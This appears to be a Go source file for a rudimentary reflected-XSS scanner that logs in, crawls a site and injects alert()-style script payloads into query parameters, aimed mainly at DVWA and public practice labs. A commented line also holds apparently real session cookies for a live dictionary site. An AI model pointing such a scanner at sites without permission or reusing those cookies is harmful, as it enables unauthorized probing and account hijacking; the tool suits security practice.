package main

import (
	"encoding/json"
	"fmt"
	"github.com/PuerkitoBio/goquery"
	"github.com/headzoo/surf"
	"github.com/headzoo/surf/agent"
	"github.com/headzoo/surf/browser"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"strings"
)

type empty struct{}

var targetURLs map[string]empty
var vulnerableURLs map[string]empty
var urlSTR, host, loginURL string
var urlParsed *url.URL
var bow *browser.Browser
var badUrls []string
var jar *cookiejar.Jar
var cookies []*http.Cookie
var payloads []string


func main() {

	p1 := []string{"<script>alert('XSS');</script>","<BODY ONLOAD=alert('XSS')>"}
	p2 := []string{"><script>alert(0)</script>", "\" onfocus=\"alert(1);", "javascript:alert(1)","\"><img src=\"x:x\" onerror=\"alert(0)\">"}

	payloads = append(payloads, p1...)
	payloads = append(payloads, p2...)


	bow = surf.NewBrowser()

	//bow.SetAttribute(browser.SendReferer, false)
	//bow.SetAttribute(browser.MetaRefreshHandling, false)
	bow.SetAttribute(browser.FollowRedirects, true)
	bow.SetUserAgent(agent.Firefox())

	// we create a cookie jar that will provide being statefull
	// after attaching a cookie jar to http.Client, http.client will
	// add cookies and update in every request and response
	jar, _ = cookiejar.New(nil)
	bow.SetCookieJar(jar)

	targetURLs = map[string]empty{}
	vulnerableURLs = map[string]empty{}
	urlSTR = "http://localhost/dvwa/"
	//urlSTR = "https://www.seslisozluk.net/"
	//urlSTR = "https://xss-game.appspot.com"
	urlParsed, _ = url.Parse(urlSTR)

	host = urlParsed.Host
	level := 5

	badUrls = append(badUrls, []string{"%C3%A7%C4%B1k%C4%B1%C5%9F", "logout", ".png", ".jpg", ".jpeg", ".mp3", ".mp4", ".avi", ".gif", ".svg"}...)

	err := bow.Open(urlSTR)
	if err != nil {
		panic(err)
	}

	// add the first target to list
	targetURLs[urlSTR] = empty{}
	
	Login(urlSTR)
	//SetCookie()

	crawlURL(urlSTR)

	if level > 1 {
		for i := 2; i <= level; i++ {
			for tempURL, _ := range targetURLs {
				crawlURL(tempURL)
			}
		}
	}

	i := 1
	for u, _ := range targetURLs {
		fmt.Println(i, u)
		i++
	}

	//for u := range targetURLs{
	//	control(u)
	//}

	control("a")

	res,_ := json.Marshal(vulnerableURLs)
	fmt.Println("Vulnerable URLS:")
	fmt.Println(string(res))

}

func control(u string){
	u="http://www.insecurelabs.org/Search.aspx?query=cemal"
	// convert string to url.URL
	originalURL,_ := url.Parse(u)
	modifiedURL := originalURL

	// get query parameters and values as map[string][]string
	q := originalURL.Query()

	// checking query parameters Ex: username=xx&email=yy
	// only one parameter is changed at once
	if len(q)>0{
		for parameter := range q{
			for _,payload := range payloads{

				modifiedURL = originalURL
				q.Set(parameter,payload)
				modifiedURL.RawQuery = q.Encode()
				if valideResponse(modifiedURL,payload) == true {
					break
				}
			}
		}
	}

	err := bow.Open(u)
	if err != nil{
		fmt.Println(err)
	}








}

func valideResponse(u *url.URL,payload string)(bool){
	// TODO: to get rid of false positives, it is needed to use a real browser. ==>

	fmt.Println("Testing :",u)
	err := bow.Open(u.String())
	if err != nil{
		fmt.Println(err)
	}

	if strings.Contains(bow.Body(),payload){
		if _,contains := vulnerableURLs[u.String()]; !contains{
			vulnerableURLs[u.String()]=empty{}
		}
		// if one payload is executed successfully no need to try other payloads
		return true
	}
	return false
}

func crawlURL(u string) {

	// Crawler travers as BFS tree

	err := bow.Open(u)
	if err != nil {
		panic(err)
	}

	// return all links in the current page
	links := bow.Links()

	// TODO: dont get non-html files (jpg,png,pdf..)
	//i:=0
	for _, link := range links {

		//fmt.Println(link)

		_, ifContains := targetURLs[link.Url().String()]
		whitelisted := true
		for _, b := range badUrls {
			if strings.Contains(link.Url().String(), b) {
				whitelisted = false
				break
			}

		}

		// search for same domain
		// do not allow unwanted urls like: png,jpg,pdf etc.
		// add if the URL not already in slice
		if strings.Compare(host, link.Url().Host) == 0 && !ifContains && whitelisted {

			//fmt.Println(link)
			targetURLs[link.Url().String()] = empty{}
			//i++
			//fmt.Println(i, link.Url())

		}

	}
}

func LoginByCredentials(loginURL string, user string, pass string) {

	fm, _ := bow.Form("form")
	fm.Input("username", "admin")
	fm.Input("password", "password")
	fmt.Println(fm.GetFields())
	fm.Submit()
	fmt.Println("submit:")
	for _, c := range bow.CookieJar().Cookies(urlParsed) {
		res, _ := json.Marshal(c)
		fmt.Println(string(res))
	}

}

func Login(loginURL string) {

	err := bow.Open(urlSTR)
	if err != nil {
		panic(err)
	}

	allForms := bow.Forms()
	var text string

	for _, fm := range allForms {
		if fm != nil {
			fmt.Println("Form found.. : ")
			fm.Dom().Find("input").Each(func(i int, s *goquery.Selection) {
				// For each item found, get the band and title
				if inputName, ok := s.Attr("name"); ok {
					if inputType, ok2 := s.Attr("type"); ok2 {
						if inputType == "text" || inputType == "password" {
							fmt.Print("Enter ", inputName, ":")
							fmt.Scanln(&text)
							fm.Input(inputName, text)
						}
					}
				}

			})

			fmt.Println(fm.GetFields())

			err = fm.Submit()
			if err != nil {
				panic(err)
			}

			fmt.Println("Succesfully loged in..")
			fmt.Println("Cookies are set as:")

			for _, c := range bow.CookieJar().Cookies(urlParsed) {
				res, _ := json.Marshal(c)
				fmt.Println(string(res))
			}
		}
	}
}

func SetCookie() {

	cookie := &http.Cookie{
		Domain: "localhost",
		Name:   "PHPSESSID",
		Value:  "j5mdm88v2ougl2kjrrinsfcsd1",
	}
	cookies = append(cookies, cookie)

	cookie = &http.Cookie{
		Domain: "localhost",
		Name:   "security",
		Value:  "impossible",
	}
	cookies = append(cookies, cookie)

	jar.SetCookies(urlParsed, cookies)
	bow.SetCookieJar(jar)

	fmt.Println("afterr:")
	for _, c := range bow.CookieJar().Cookies(urlParsed) {
		res, _ := json.Marshal(c)
		fmt.Println(string(res))
	}

}

// way to print current cookies
//for _,c:= range bow.CookieJar().Cookies(urlParsed){
//res,_ := json.Marshal(c)
//fmt.Println(string(res))
//}

// adding a raw cookiee to header
// rawCookies := "PHPSESSID=impo9avkj57e14cb2cdju0iid7; security=impossible"
////rawCookies := "pref_uil=lang_tr; SS_SD=6; __gads=ID=1438700420a161b8:T=1518763891:S=ALNI_MZGoZeQsE4HUNJZmXPLvwLgwf7kMg; seslisozluk=vis+a+vis%7Ck%C3%BCf%C3%BCr+etmek%7Ccanlanm%7Cyeniden+dirilmek%7Cresurge%7Cresurgent; PHPSESSID=r1m5bp7jtfpbdmob80l8b8ed76; remember_key=KCD3SC095L01; remember_memberid=543452; _ga=GA1.2.495857112.1518763891; _gid=GA1.2.1617837352.1521717907; _gat=1"
//
//// to convert the raw cookie to *http.Cookie we use this trick
//header := http.Header{}
//header.Add("Cookie", rawCookies)
//request := http.Request{Header: header}
//
//cookies := request.Cookies()
//fmt.Println(request.Cookies())

// TODO: q := u.Query() ile get parametrelerini al, daha sonra ParseQuery(a=b&y=z) ile map olarak cek
